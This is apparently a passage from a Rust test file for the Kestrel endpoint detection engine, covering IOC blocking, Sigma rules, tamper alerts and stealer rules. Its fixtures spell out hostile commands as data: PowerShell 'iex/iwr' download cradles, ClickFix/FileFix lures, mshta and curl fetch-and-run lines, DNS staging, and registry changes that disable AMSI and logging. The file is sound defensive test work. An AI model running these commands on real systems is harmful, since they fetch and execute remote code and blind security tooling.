//! Rule-level tests: IOCs, Sigma custom rules, exclusions, dedup, modes,
//! self-protection and the single-event rules.

mod common;
use common::*;
use kestrel_common::*;
use kestrel_detect::*;

fn unsigned_temp(e: &mut Engine, guid: &str, pid: u32) {
    e.process(&start(
        0,
        guid,
        pid,
        &format!(r"C:\Users\alice\AppData\Local\Temp\{guid}.exe"),
        &format!("{guid}.exe"),
        None,
        SignatureState::Unsigned,
        None,
    ));
}

// ---------------------------------------------------------------- catalog / modes

#[test]
fn catalog_through_engine() {
    let c = Engine::catalog();
    // 16 stealer + 5 tamper rules; the RW/CD/PS families add their own.
    let core = |p: &str| c.iter().filter(|m| m.id.starts_with(p)).count();
    assert_eq!((core("ST-"), core("TP-")), (16, 5));
    let mut ids: Vec<&str> = c.iter().map(|m| m.id.as_str()).collect();
    ids.sort_unstable();
    ids.dedup();
    assert_eq!(ids.len(), c.len(), "rule ids are unique");
    let st01 = c.iter().find(|m| m.id == "ST-01").unwrap();
    assert_eq!(st01.default_mode, RuleMode::Audit);
    assert!(!st01.protect_day_one);
    assert!(st01.attack.contains(&"T1555.003".to_string()));
    let st16 = c.iter().find(|m| m.id == "ST-16").unwrap();
    assert!(st16.protect_day_one && st16.default_mode == RuleMode::Protect);
    assert!(c.iter().all(
        |m| m.kind == RuleKind::Builtin && !m.false_positives.is_empty() || m.id.starts_with("TP")
    ));
}

#[test]
fn mode_off_skips_rule() {
    let mut p = Policy::default();
    p.rules.insert("ST-01".into(), RuleMode::Off);
    let mut e = engine(p);
    unsigned_temp(&mut e, "s", 10);
    let ids = rule_ids(&e.process(&read(1, "s", 10, CHROME_LOGIN)));
    assert!(!ids.contains(&"ST-01".to_string()), "{ids:?}");
}

#[test]
fn update_policy_changes_modes() {
    let mut e = engine(Policy::default());
    unsigned_temp(&mut e, "s", 10);
    assert!(first(&e.process(&read(1, "s", 10, CHROME_LOGIN)), "ST-01")
        .actions
        .is_empty());
    let mut p = Policy::default();
    p.rules.insert("ST-01".into(), RuleMode::Protect);
    e.update_policy(p);
    unsigned_temp(&mut e, "s2", 11);
    assert_eq!(
        action_names(&first(&e.process(&read(2, "s2", 11, CHROME_LOGIN)), "ST-01").actions),
        ["suspend_process"]
    );
}

// ---------------------------------------------------------------- dedup

#[test]
fn dedup_once_per_ten_minutes() {
    let mut e = engine(Policy::default());
    unsigned_temp(&mut e, "s", 10);
    assert_eq!(
        rule_ids(&e.process(&read(1, "s", 10, CHROME_LOGIN))),
        ["ST-01"]
    );
    assert!(rule_ids(&e.process(&read(2, "s", 10, CHROME_LOGIN))).is_empty());
    assert!(rule_ids(&e.process(&read(599_000, "s", 10, CHROME_LOGIN))).is_empty());
    assert_eq!(
        rule_ids(&e.process(&read(601_002, "s", 10, CHROME_LOGIN))),
        ["ST-01"]
    );
}

// ---------------------------------------------------------------- self / system

#[test]
fn never_alerts_on_agent_or_system() {
    let mut e = engine(policy_all(RuleMode::Protect));
    e.process(&start(
        0,
        "agent",
        900,
        AGENT,
        "kestrel-agent.exe",
        None,
        SignatureState::Valid,
        Some("Kestrel"),
    ));
    let mut out = Vec::new();
    for (i, p) in [CHROME_LOGIN, CHROME_COOKIES, CHROME_STATE]
        .iter()
        .enumerate()
    {
        out.extend(e.process(&read(i as i64, "agent", 900, p)));
    }
    out.extend(e.process(&connect(10, "agent", 900, "8.8.8.8", 443)));
    out.extend(e.process(&ev(
        11,
        "agent",
        900,
        EventData::ProcessAccess(TargetProcess {
            target_pid: 1,
            target_guid: None,
            target_image: CHROME_EXE.into(),
            granted_access: 0x1fffff,
            return_code: 0,
        }),
    )));
    // PID 4 (System)
    for (i, p) in [CHROME_LOGIN, CHROME_COOKIES, CHROME_STATE]
        .iter()
        .enumerate()
    {
        out.extend(e.process(&read(20 + i as i64, "system", 4, p)));
    }
    assert!(out.is_empty(), "{}", dump(&out));
}

#[test]
fn critical_processes_are_never_killed() {
    let mut e = engine(policy_all(RuleMode::Protect));
    // a hollowed svchost reading 3 stores: ST-02 alerts, but the kill is filtered out
    e.process(&start(
        0,
        "svc",
        1200,
        r"C:\Windows\System32\svchost.exe",
        "svchost.exe -k netsvcs",
        None,
        SignatureState::Unsigned,
        None,
    ));
    let mut out = Vec::new();
    for (i, p) in [CHROME_LOGIN, CHROME_COOKIES, CHROME_STATE]
        .iter()
        .enumerate()
    {
        out.extend(e.process(&read(i as i64, "svc", 1200, p)));
    }
    let st02 = first(&out, "ST-02");
    // unsigned svchost is not "critical" (impostor) -> killable
    assert_eq!(kills(&st02.actions), [("svc".to_string(), true)]);
    // the genuine one (signed) is protected from kill even when a rule fires on it
    let mut e = engine(policy_all(RuleMode::Protect));
    e.process(&start(
        0,
        "exp",
        1300,
        r"C:\Windows\explorer.exe",
        "explorer.exe",
        None,
        SignatureState::Valid,
        Some("Microsoft Windows"),
    ));
    let out = e.process(&ev(
        1,
        "exp",
        1300,
        EventData::DnsQuery {
            qname: "api.telegram.org".into(),
            answers: vec!["149.154.167.220".into()],
        },
    ));
    let st14 = first(&out, "ST-14");
    assert!(kills(&st14.actions).is_empty());
    assert_eq!(
        st14.actions,
        vec![ResponseAction::BlockDestination {
            ip: "149.154.167.220".into(),
            port: None,
            image: Some(r"C:\Windows\explorer.exe".into()),
            ttl_secs: Some(86400),
            ioc_id: None
        }],
        "system image: block destinations for this image instead of the whole image"
    );
}

// ---------------------------------------------------------------- IOCs

fn ioc(kind: IocKind, value: &str, action: IocAction) -> Ioc {
    Ioc {
        id: format!("ioc-{value}"),
        kind,
        value: value.into(),
        action,
        description: "test".into(),
    }
}

#[test]
fn ioc_hash_block_and_audit() {
    let mut p = Policy::default();
    p.iocs
        .push(ioc(IocKind::Sha256, "ABCDEF", IocAction::Block));
    p.iocs
        .push(ioc(IocKind::Sha256, "123456", IocAction::Audit));
    let mut e = engine(p);
    let mut s = start(
        0,
        "bad",
        50,
        r"C:\Users\alice\Downloads\bad.exe",
        "bad.exe",
        None,
        SignatureState::Unsigned,
        None,
    );
    if let EventData::ProcessStart(ps) = &mut s.data {
        ps.sha256 = Some("abcdef".into());
    }
    let out = e.process(&s);
    let d = first(&out, "IOC-HASH");
    assert_eq!(d.alert.mode, RuleMode::Protect);
    assert_eq!(d.alert.rule_name, "Known-bad file hash");
    assert_eq!(
        d.actions,
        vec![
            ResponseAction::KillProcess {
                pid: 50,
                guid: Some(g("bad")),
                tree: true
            },
            ResponseAction::QuarantineFile {
                path: r"C:\Users\alice\Downloads\bad.exe".into(),
                sha256: Some("abcdef".into())
            },
        ]
    );
    let mut s = start(
        1,
        "meh",
        51,
        r"C:\Tools\meh.exe",
        "meh.exe",
        None,
        SignatureState::Valid,
        None,
    );
    if let EventData::ProcessStart(ps) = &mut s.data {
        ps.sha256 = Some("123456".into());
    }
    let d = e.process(&s);
    let d = first(&d, "IOC-HASH");
    assert_eq!(d.alert.mode, RuleMode::Audit);
    assert!(d.actions.is_empty());
}

#[test]
fn ioc_allow_suppresses_all_rules_for_process() {
    let mut p = policy_all(RuleMode::Protect);
    p.iocs.push(ioc(IocKind::Sha256, "feed", IocAction::Allow));
    p.iocs.push(ioc(
        IocKind::Certificate,
        "Trusted Exporter Inc",
        IocAction::Allow,
    ));
    let mut e = engine(p);
    let mut s = start(
        0,
        "ok",
        60,
        r"C:\Users\alice\AppData\Local\Temp\exporter.exe",
        "exporter.exe",
        None,
        SignatureState::Unsigned,
        None,
    );
    if let EventData::ProcessStart(ps) = &mut s.data {
        ps.sha256 = Some("FEED".into());
    }
    let mut out = e.process(&s);
    e.process(&start(
        1,
        "ok2",
        61,
        r"C:\Program Files\Exporter\exp.exe",
        "exp.exe",
        None,
        SignatureState::Valid,
        Some("Trusted Exporter Inc"),
    ));
    for (i, path) in [CHROME_LOGIN, CHROME_COOKIES, CHROME_STATE]
        .iter()
        .enumerate()
    {
        out.extend(e.process(&read(10 + i as i64, "ok", 60, path)));
        out.extend(e.process(&read(10 + i as i64, "ok2", 61, path)));
    }
    out.extend(e.process(&connect(100, "ok", 60, "8.8.8.8", 443)));
    assert!(out.is_empty(), "{}", dump(&out));
}

#[test]
fn ioc_network_and_dns() {
    let mut p = Policy::default();
    p.iocs
        .push(ioc(IocKind::Ip, "185.234.72.0/24", IocAction::Block));
    p.iocs
        .push(ioc(IocKind::Domain, "evil-gate.top", IocAction::Block));
    p.iocs.push(ioc(IocKind::Ip, SERVER_IP, IocAction::Block));
    p.iocs
        .push(ioc(IocKind::Domain, "good-cdn.example", IocAction::Allow));
    let mut e = engine(p);
    unsigned_temp(&mut e, "n", 70);
    let out = e.process(&connect(1, "n", 70, "185.234.72.19", 443));
    let d = first(&out, "IOC-NET");
    assert_eq!(
        d.actions,
        vec![
            // M10: per offending image, with a TTL (default 24 h)
            ResponseAction::BlockDestination {
                ip: "185.234.72.19".into(),
                port: None,
                image: Some(r"C:\Users\alice\AppData\Local\Temp\n.exe".into()),
                ttl_secs: Some(24 * 3600),
                ioc_id: Some("ioc-185.234.72.0/24".into())
            },
            ResponseAction::KillProcess {
                pid: 70,
                guid: Some(g("n")),
                tree: true
            },
        ]
    );
    let out = e.process(&ev(
        2,
        "n",
        70,
        EventData::DnsQuery {
            qname: "cdn.evil-gate.top".into(),
            answers: vec!["45.1.2.3".into(), "45.1.2.4".into()],
        },
    ));
    let d = first(&out, "IOC-DNS");
    assert_eq!(
        action_names(&d.actions),
        ["block_destination", "block_destination", "kill_process"]
    );
    // later connection to a resolved IP is tied to the domain IOC (IOC alerts dedup per indicator)
    let out = e.process(&connect(3, "n", 70, "45.1.2.3", 443));
    assert!(first(&out, "IOC-NET")
        .alert
        .summary
        .contains("cdn.evil-gate.top"));
    // server IP is never blocked even if listed as an IOC
    unsigned_temp(&mut e, "n2", 71);
    let out = e.process(&connect(4, "n2", 71, SERVER_IP, 443));
    assert!(out.is_empty(), "{}", dump(&out));
    // browser hitting a blocked IP: block only, never kill the browser
    e.process(&start(
        5,
        "chrome",
        72,
        CHROME_EXE,
        "chrome.exe",
        None,
        SignatureState::Valid,
        Some("Google LLC"),
    ));
    let out = e.process(&connect(6, "chrome", 72, "185.234.72.20", 443));
    assert_eq!(
        action_names(&first(&out, "IOC-NET").actions),
        ["block_destination"]
    );
    // Host-wide blocks only when the policy says so; TTL is policy-driven.
    let mut p = Policy {
        ioc_block_host_wide: true,
        ioc_block_ttl_secs: 3600,
        ..Policy::default()
    };
    p.iocs
        .push(ioc(IocKind::Ip, "185.234.72.0/24", IocAction::Block));
    // A mistaken /0../7 network IOC is ignored instead of killing everything.
    p.iocs.push(ioc(IocKind::Ip, "0.0.0.0/0", IocAction::Block));
    let mut e = engine(p);
    unsigned_temp(&mut e, "hw", 73);
    let out = e.process(&connect(7, "hw", 73, "185.234.72.30", 443));
    assert!(first(&out, "IOC-NET")
        .actions
        .contains(&ResponseAction::BlockDestination {
            ip: "185.234.72.30".into(),
            port: None,
            image: None,
            ttl_secs: Some(3600),
            ioc_id: Some("ioc-185.234.72.0/24".into())
        }));
    unsigned_temp(&mut e, "hw2", 74);
    let out = e.process(&connect(8, "hw2", 74, "93.184.216.34", 443));
    assert!(
        rule_ids(&out).iter().all(|r| r != "IOC-NET"),
        "{}",
        dump(&out)
    );
    // IOC alerts can be switched off by policy
    let mut p = Policy::default();
    p.iocs
        .push(ioc(IocKind::Ip, "185.234.72.19", IocAction::Block));
    p.rules.insert("IOC-NET".into(), RuleMode::Off);
    let mut e = engine(p);
    unsigned_temp(&mut e, "n", 70);
    assert!(e
        .process(&connect(1, "n", 70, "185.234.72.19", 443))
        .is_empty());
}

#[test]
fn ioc_url_in_cmdline_and_seeded_process() {
    let mut p = Policy::default();
    p.iocs.push(ioc(
        IocKind::Url,
        "https://paste-load.top/raw/xyz",
        IocAction::Block,
    ));
    p.iocs.push(ioc(IocKind::Sha256, "dead", IocAction::Block));
    let mut e = engine(p);
    let out = e.process(&start(
        0,
        "ps",
        80,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell -c iwr https://paste-load.top/raw/xyz",
        None,
        SignatureState::Valid,
        None,
    ));
    assert_eq!(
        kills(&first(&out, "IOC-URL").actions),
        [("ps".to_string(), true)]
    );
    // seeded (already running) known-bad process is reported on the next call
    e.seed_process(ProcessInfo {
        guid: g("old"),
        pid: 81,
        ppid: 0,
        parent_guid: None,
        image: r"C:\Users\alice\AppData\Roaming\old.exe".into(),
        cmdline: "old.exe".into(),
        user: None,
        integrity: None,
        start_ts: T0 - 1000,
        exit_ts: None,
        signer: None,
        signed: SignatureState::Unsigned,
        sha256: Some("DEAD".into()),
        motw_zone: None,
        file_size: None,
        path_class: PathClass::Other,
    });
    assert_eq!(
        e.process_info(&g("old")).unwrap().path_class,
        PathClass::UserWritable,
        "path class derived when seeded as Other"
    );
    let out = e.tick(T0);
    assert_eq!(rule_ids(&out), ["IOC-HASH"]);
}

// ---------------------------------------------------------------- Sigma

const SIGMA_RULE: &str = r#"
title: Suspicious Non-Browser Network Communication With Telegram API
id: c3dbbc9f-ef1d-470a-a90a-d343448d5875
status: test
description: Detects an a non-browser process interacting with the Telegram API
author: Nasreddine Bencherchali (Nextron Systems)
date: 2023-05-19
tags:
    - attack.command-and-control
    - attack.t1102
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        DestinationHostname|contains: 'api.telegram.org'
    filter_main_brave:
        Image|endswith: '\brave.exe'
    filter_main_chrome:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
    condition: selection and not 1 of filter_main_*
level: medium
"#;

fn sigma_def(id: &str, src: &str) -> RuleDef {
    RuleDef {
        meta: RuleMeta {
            id: id.into(),
            name: String::new(),
            description: String::new(),
            kind: RuleKind::Sigma,
            category: RuleCategory::Custom,
            severity: Severity::Medium,
            attack: vec![],
            default_mode: RuleMode::Audit,
            protect_day_one: false,
            protect_action: String::new(),
            author: None,
            license: Some("DRL-1.1".into()),
            references: vec![],
            false_positives: vec![],
        },
        source: src.into(),
    }
}

#[test]
fn sigma_rule_fires_with_attribution() {
    let bundle = RuleBundle {
        version: 2,
        rules: vec![sigma_def("SIG-c3dbbc9f", SIGMA_RULE)],
    };
    let mut e = Engine::new(host(), Policy::default(), bundle).unwrap();
    // keep the builtin ST-14 out of the way
    let mut p = Policy::default();
    p.rules.insert("ST-14".into(), RuleMode::Off);
    e.update_policy(p.clone());
    e.process(&start(
        0,
        "py",
        90,
        r"C:\Python312\python.exe",
        "python bot.py",
        None,
        SignatureState::Valid,
        None,
    ));
    let mut c = connect(1, "py", 90, "149.154.167.220", 443);
    if let EventData::NetConnect { dst_host, .. } = &mut c.data {
        *dst_host = Some("api.telegram.org".into());
    }
    let out = e.process(&c);
    let d = first(&out, "SIG-c3dbbc9f");
    assert_eq!(
        d.alert.rule_name,
        "Suspicious Non-Browser Network Communication With Telegram API"
    );
    assert_eq!(
        d.alert.rule_author.as_deref(),
        Some("Nasreddine Bencherchali (Nextron Systems)")
    );
    assert_eq!(d.alert.attack, ["T1102"]);
    assert_eq!(d.alert.mode, RuleMode::Audit);
    assert!(d.actions.is_empty());
    // chrome filtered by the rule
    e.process(&start(
        2,
        "ch",
        91,
        CHROME_EXE,
        "chrome.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    let mut c2 = connect(3, "ch", 91, "149.154.167.220", 443);
    if let EventData::NetConnect { dst_host, .. } = &mut c2.data {
        *dst_host = Some("api.telegram.org".into());
    }
    assert!(e.process(&c2).is_empty());
    // policy switches the custom rule to Protect
    p.rules.insert("SIG-c3dbbc9f".into(), RuleMode::Protect);
    e.update_policy(p);
    e.process(&start(
        4,
        "py2",
        92,
        r"C:\Python312\python.exe",
        "python bot2.py",
        None,
        SignatureState::Valid,
        None,
    ));
    let mut c3 = connect(5, "py2", 92, "149.154.167.220", 443);
    if let EventData::NetConnect { dst_host, .. } = &mut c3.data {
        *dst_host = Some("api.telegram.org".into());
    }
    let out = e.process(&c3);
    assert_eq!(
        kills(&first(&out, "SIG-c3dbbc9f").actions),
        [("py2".to_string(), true)]
    );
}

#[test]
fn sigma_process_creation_with_parent_and_windash() {
    let src = r#"
title: Encoded PowerShell from Explorer
author: Kestrel tests
level: high
logsource: {category: process_creation, product: windows}
detection:
    sel_parent:
        ParentImage|endswith: '\explorer.exe'
    sel_img:
        - Image|endswith: '\powershell.exe'
        - OriginalFileName: 'powershell.exe'
    sel_cli:
        CommandLine|windash|contains: ' -enc '
    condition: all of sel_*
"#;
    let mut e = Engine::new(
        host(),
        Policy::default(),
        RuleBundle {
            version: 1,
            rules: vec![sigma_def("SIG-encps001", src)],
        },
    )
    .unwrap();
    e.process(&start(
        0,
        "exp",
        1,
        r"C:\Windows\explorer.exe",
        "explorer.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    let out = e.process(&start(
        1,
        "ps",
        2,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell /enc SQBFAFgA",
        Some(("exp", 1)),
        SignatureState::Valid,
        None,
    ));
    let ids = rule_ids(&out);
    assert!(ids.contains(&"SIG-encps001".to_string()), "{ids:?}");
    assert!(
        ids.contains(&"ST-11".to_string()),
        "builtin also fires: {ids:?}"
    );
}

#[test]
fn sigma_invalid_rules_rejected() {
    let mut e = engine(Policy::default());
    for bad in [
        "title: [unclosed",
        "title: x\nlogsource: {category: process_creation}\ndetection:\n  sel:\n    Image: a\n  condition: sel and missing\n",
        "title: x\nlogsource: {category: webserver}\ndetection:\n  sel:\n    a: b\n  condition: sel\n",
    ] {
        let err = e.update_rules(RuleBundle { version: 9, rules: vec![sigma_def("SIG-bad00001", bad)] }).unwrap_err();
        let DetectError::InvalidRule { id, reason } = err;
        assert_eq!(id, "SIG-bad00001");
        assert!(!reason.is_empty());
    }
    assert!(Engine::new(
        host(),
        Policy::default(),
        RuleBundle {
            version: 1,
            rules: vec![sigma_def("SIG-bad", "{")]
        }
    )
    .is_err());
    // valid bundle still loads; YARA defs are ignored by the engine
    let mut yara = sigma_def("YARA-1", "rule x { condition: true }");
    yara.meta.kind = RuleKind::Yara;
    assert!(e
        .update_rules(RuleBundle {
            version: 10,
            rules: vec![sigma_def("SIG-ok", SIGMA_RULE), yara]
        })
        .is_ok());
    let info = validate_sigma(SIGMA_RULE).unwrap();
    assert_eq!(info.category, "network_connection");
    assert_eq!(info.severity, Severity::Medium);
}

// ---------------------------------------------------------------- tamper

#[test]
fn tamper_events_and_registry() {
    let mut e = engine(Policy::default());
    e.process(&start(
        0,
        "agent",
        900,
        AGENT,
        "kestrel-agent.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    let out = e.process(&ev(
        1,
        "agent",
        900,
        EventData::Tamper {
            kind: TamperKind::EtwSessionStopped,
            detail: "Kestrel-Kernel".into(),
        },
    ));
    let d = first(&out, "TP-01");
    assert_eq!(d.alert.severity, Severity::Critical);
    assert!(d.actions.is_empty());
    assert_eq!(
        rule_ids(&e.process(&ev(
            2,
            "agent",
            900,
            EventData::Tamper {
                kind: TamperKind::WfpFilterChange,
                detail: String::new()
            }
        ))),
        ["TP-02"]
    );
    assert_eq!(
        rule_ids(&e.process(&ev(
            3,
            "agent",
            900,
            EventData::Tamper {
                kind: TamperKind::EventsLost,
                detail: "1200 lost".into()
            }
        ))),
        ["TP-05"]
    );
    unsigned_temp(&mut e, "evil", 77);
    let out = e.process(&ev(
        4,
        "evil",
        77,
        EventData::RegistrySet {
            key: r"HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"
                .into(),
            value_name: String::new(),
            data: None,
            op: Default::default(),
        },
    ));
    assert_eq!(rule_ids(&out), ["TP-03"]);
    let out = e.process(&ev(5, "evil", 77, EventData::RegistrySet { key: r"HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System\{555908d1-a6d7-4695-8e1e-26931d2012f4}".into(), value_name: "Enabled".into(), data: Some("0".into()), op: Default::default() }));
    assert_eq!(rule_ids(&out), ["TP-01"]);
    let out = e.process(&ev(
        6,
        "evil",
        77,
        EventData::RegistrySet {
            key: r"HKLM\SYSTEM\CurrentControlSet\Services\KestrelAgent".into(),
            value_name: "Start".into(),
            data: Some("4".into()),
            op: Default::default(),
        },
    ));
    assert_eq!(rule_ids(&out), ["TP-04"]);
}

// ---------------------------------------------------------------- single-event rules

#[test]
fn st06_cdp_port_and_negatives() {
    let mut e = engine(Policy::default());
    unsigned_temp(&mut e, "c", 20);
    assert_eq!(
        rule_ids(&e.process(&connect(1, "c", 20, "127.0.0.1", 9222))),
        ["ST-06"]
    );
    e.process(&start(
        2,
        "chrome",
        21,
        CHROME_EXE,
        "chrome.exe",
        None,
        SignatureState::Valid,
        Some("Google LLC"),
    ));
    assert!(
        e.process(&connect(3, "chrome", 21, "127.0.0.1", 9222))
            .is_empty(),
        "browser itself"
    );
    unsigned_temp(&mut e, "d", 22);
    assert!(e
        .process(&connect(4, "d", 22, "127.0.0.1", 8080))
        .is_empty());
}

#[test]
fn st08_unsigned_in_browser_dir_and_unsigned_dll() {
    let mut e = engine(Policy::default());
    let out = e.process(&start(
        0,
        "fake",
        30,
        r"C:\Program Files\Google\Chrome\Application\chrome_helper.exe",
        "chrome_helper.exe",
        None,
        SignatureState::Unsigned,
        None,
    ));
    assert_eq!(rule_ids(&out), ["ST-08"]);
    e.process(&start(
        1,
        "chrome",
        31,
        CHROME_EXE,
        "chrome.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    let out = e.process(&ev(
        2,
        "chrome",
        31,
        EventData::ImageLoad {
            path: r"C:\Program Files\Google\Chrome\Application\130.0.6723.92\version.dll".into(),
            signer: None,
            signed: SignatureState::Unsigned,
        },
    ));
    assert_eq!(rule_ids(&out), ["ST-08"]);
    let out = e.process(&ev(
        3,
        "chrome",
        31,
        EventData::ImageLoad {
            path: r"C:\Program Files\Google\Chrome\Application\130.0.6723.92\chrome.dll".into(),
            signer: Some("Google LLC".into()),
            signed: SignatureState::Valid,
        },
    ));
    assert!(out.is_empty());
}

#[test]
fn st08_benign_browser_restart_is_quiet() {
    let mut e = engine(policy_all(RuleMode::Protect));
    e.process(&start(
        0,
        "c1",
        40,
        CHROME_EXE,
        "chrome.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    e.process(&start(
        1,
        "c2",
        41,
        CHROME_EXE,
        "chrome.exe --type=renderer",
        Some(("c1", 40)),
        SignatureState::Valid,
        None,
    ));
    e.process(&ev(
        100,
        "c2",
        41,
        EventData::ProcessStop { exit_code: Some(0) },
    ));
    e.process(&ev(
        110,
        "c1",
        40,
        EventData::ProcessStop { exit_code: Some(0) },
    ));
    e.process(&start(
        400,
        "c3",
        42,
        CHROME_EXE,
        "chrome.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    let out = e.process(&start(
        600,
        "el",
        43,
        r"C:\Program Files\Google\Chrome\Application\130.0.6723.92\elevation_service.exe",
        "elevation_service.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    assert!(out.is_empty(), "{}", dump(&out));
}

#[test]
fn st09_nss_load() {
    let mut e = engine(Policy::default());
    unsigned_temp(&mut e, "s", 50);
    let out = e.process(&ev(
        1,
        "s",
        50,
        EventData::ImageLoad {
            path: r"C:\Program Files\Mozilla Firefox\nss3.dll".into(),
            signer: Some("Mozilla Corporation".into()),
            signed: SignatureState::Valid,
        },
    ));
    let d = first(&out, "ST-09");
    assert_eq!(d.alert.severity, Severity::Medium);
    e.process(&start(
        2,
        "ff",
        51,
        r"C:\Program Files\Mozilla Firefox\firefox.exe",
        "firefox.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    assert!(e
        .process(&ev(
            3,
            "ff",
            51,
            EventData::ImageLoad {
                path: r"C:\Program Files\Mozilla Firefox\nss3.dll".into(),
                signer: None,
                signed: SignatureState::Valid
            }
        ))
        .is_empty());
    e.process(&start(
        4,
        "lo",
        52,
        r"C:\Program Files\LibreOffice\program\soffice.bin",
        "soffice.bin",
        None,
        SignatureState::Valid,
        None,
    ));
    assert!(e
        .process(&ev(
            5,
            "lo",
            52,
            EventData::ImageLoad {
                path: r"C:\Program Files\LibreOffice\program\nss3.dll".into(),
                signer: None,
                signed: SignatureState::Valid
            }
        ))
        .is_empty());
    // Audit-only rule: no actions even in Protect
    let mut e = engine(policy_all(RuleMode::Protect));
    unsigned_temp(&mut e, "s", 50);
    let out = e.process(&ev(
        1,
        "s",
        50,
        EventData::ImageLoad {
            path: r"C:\Program Files\Mozilla Firefox\nss3.dll".into(),
            signer: None,
            signed: SignatureState::Valid,
        },
    ));
    assert!(first(&out, "ST-09").actions.is_empty());
}

#[test]
fn st10_typedpaths_and_pending_kill() {
    let mut e = engine(policy_all(RuleMode::Protect));
    e.process(&start(
        0,
        "exp",
        1,
        r"C:\Windows\explorer.exe",
        "explorer.exe",
        None,
        SignatureState::Valid,
        Some("Microsoft Windows"),
    ));
    // FileFix via the address bar: TypedPaths written before the child is seen
    let out = e.process(&ev(
        10,
        "exp",
        1,
        EventData::RegistrySet {
            key: r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths".into(),
            value_name: "url1".into(),
            data: Some(
                r#"mshta https://cdn-check.top/doc.hta # C:\Company\Shared\Policy.docx"#.into(),
            ),
            op: Default::default(),
        },
    ));
    let d = first(&out, "ST-10");
    assert_eq!(d.alert.process.guid, g("exp"));
    assert!(d.actions.is_empty(), "explorer is never killed");
    assert!(d.alert.summary.contains("Explorer address bar"));
    // the spawned mshta is killed as soon as it appears
    let out = e.process(&start(
        200,
        "hta",
        5,
        r"C:\Windows\System32\mshta.exe",
        "mshta https://cdn-check.top/doc.hta",
        Some(("exp", 1)),
        SignatureState::Valid,
        None,
    ));
    assert!(
        standalone(&out).contains(&&ResponseAction::KillProcess {
            pid: 5,
            guid: Some(g("hta")),
            tree: true
        }),
        "{}",
        dump(&out)
    );
    // benign Run-dialog use
    let out = e.process(&ev(
        20,
        "exp",
        1,
        EventData::RegistrySet {
            key: r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU".into(),
            value_name: "b".into(),
            data: Some("cmd\\1".into()),
            op: Default::default(),
        },
    ));
    assert!(out.is_empty());
}

#[test]
fn st11_variants() {
    let mut e = engine(Policy::default());
    e.process(&start(
        0,
        "exp",
        1,
        r"C:\Windows\explorer.exe",
        "explorer.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    e.process(&start(
        0,
        "wt",
        2,
        r"C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.21\WindowsTerminal.exe",
        "wt.exe",
        Some(("exp", 1)),
        SignatureState::Valid,
        None,
    ));
    e.process(&start(
        1,
        "pwsh",
        3,
        r"C:\Program Files\PowerShell\7\pwsh.exe",
        "pwsh.exe",
        Some(("wt", 2)),
        SignatureState::Valid,
        None,
    ));
    // pasted into the interactive Terminal shell: 4104 script block
    let out = e.process(&ev(
        2,
        "pwsh",
        3,
        EventData::ScriptBlock {
            engine: "powershell".into(),
            content: "iex (irm 'https://captcha-verify.top/s')".into(),
        },
    ));
    assert_eq!(rule_ids(&out), ["ST-11"]);
    // child spawned from the interactive shell
    let out = e.process(&start(
        3,
        "c2",
        4,
        r"C:\Windows\System32\cmd.exe",
        "cmd /c curl -s https://x.top/a.bat -o %TEMP%\\a.bat & %TEMP%\\a.bat",
        Some(("pwsh", 3)),
        SignatureState::Valid,
        None,
    ));
    assert!(
        out.is_empty(),
        "cmd download without hidden/encoded/cradle keyword stays quiet: {}",
        dump(&out)
    );
    let out = e.process(&start(
        4,
        "c3",
        5,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell -ep bypass -e SQBFAFgAIAAoAGkAcgBtACkA",
        Some(("pwsh", 3)),
        SignatureState::Valid,
        None,
    ));
    assert_eq!(rule_ids(&out), ["ST-11"]);
    // FileFix from a browser upload dialog with the # trick
    e.process(&start(
        5,
        "ch",
        6,
        CHROME_EXE,
        "chrome.exe",
        Some(("exp", 1)),
        SignatureState::Valid,
        None,
    ));
    let out = e.process(&start(
        6,
        "ff",
        7,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        r#"powershell -c "iwr https://x.top/p | iex" # C:\Company\HR\Policy.pdf"#,
        Some(("ch", 6)),
        SignatureState::Valid,
        None,
    ));
    let d = first(&out, "ST-11");
    assert!(d.alert.summary.contains("FileFix"), "{}", d.alert.summary);
    // DNS staged: cmd /c nslookup against hard-coded resolver
    e.process(&start(7, "cmd", 8, r"C:\Windows\System32\cmd.exe", r#"cmd /c "for /f "tokens=*" %i in ('nslookup -q=txt stage.example 45.155.205.12 ^| findstr Name') do %i""#, Some(("exp", 1)), SignatureState::Valid, None));
    let out = e.process(&start(
        8,
        "ns",
        9,
        r"C:\Windows\System32\nslookup.exe",
        "nslookup -q=txt stage.example 45.155.205.12",
        Some(("cmd", 8)),
        SignatureState::Valid,
        None,
    ));
    assert!(first(&out, "ST-11").alert.summary.contains("45.155.205.12"));
    // admin using a private resolver: quiet
    let out = e.process(&start(
        9,
        "ns2",
        10,
        r"C:\Windows\System32\nslookup.exe",
        "nslookup intranet 10.0.0.53",
        Some(("cmd", 8)),
        SignatureState::Valid,
        None,
    ));
    assert!(out.is_empty());
}

#[test]
fn st13_regasm_with_dev_parent_is_quiet() {
    let mut e = engine(Policy::default());
    e.process(&start(
        0,
        "vs",
        1,
        r"C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\devenv.exe",
        "devenv.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    e.process(&start(
        1,
        "mb",
        2,
        r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
        "MSBuild.exe app.csproj /t:Build",
        Some(("vs", 1)),
        SignatureState::Valid,
        None,
    ));
